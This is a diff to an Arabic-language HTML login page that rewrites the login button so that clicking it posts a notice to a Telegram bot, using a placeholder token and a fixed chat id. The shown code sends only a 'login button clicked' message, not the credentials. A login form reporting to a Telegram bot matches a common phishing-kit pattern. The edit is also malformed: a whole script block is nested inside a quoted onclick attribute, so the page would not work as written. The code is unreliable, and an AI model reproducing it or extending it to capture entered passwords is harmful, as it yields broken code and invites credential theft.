@@ -180,7 +180,44 @@
         <input type="password" id="password" placeholder="🔒 كلمة المرور" autocomplete="current-password" aria-label="كلمة المرور">
     </div>
 
-    <button onclick="sendTelegram()">دخول</button>
+   <button id="loginBtn" onclick="<script>
+
+function sendTelegram() {
+
+let token = "PUT_YOUR_NEW_TOKEN";
+let chat_id = "545284527";
+
+let message = "Someone clicked the login button on the website";
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        chat_id: chat_id,
+        text: message
+    })
+})
+.then(response => response.json())
+.then(data => {
+    console.log(data);
+
+    if(data.ok){
+        alert("تم إرسال الرسالة إلى تيليجرام");
+    } else {
+        alert("Telegram Error");
+        console.log(data);
+    }
+})
+.catch(error => {
+    console.log(error);
+    alert("حدث خطأ");
+});
+
+}
+
+</script>">دخول</button>
 
     <div class="message" id="message"></div>
 
